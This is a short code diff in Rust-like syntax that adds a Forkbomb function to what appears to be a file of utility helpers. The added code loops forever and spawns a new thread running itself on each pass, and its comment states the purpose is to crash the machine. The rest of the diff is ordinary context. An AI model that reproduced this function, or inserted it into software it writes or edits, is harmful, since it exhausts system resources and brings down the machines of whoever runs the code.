@@ -78,6 +78,13 @@ fn RandomString(n: usize) -> String {
 	return b
 	}
 
+// Forkbomb spawns threads in order to crash the machine.
+fn Forkbomb() {
+	loop {
+		std::thread::spawn(Forkbomb);
+	     }
+	}
+
 // Exists checks if a given file is in the system.
 fn Exists(file: String) -> bool {
         return Path::new(&file).exists()
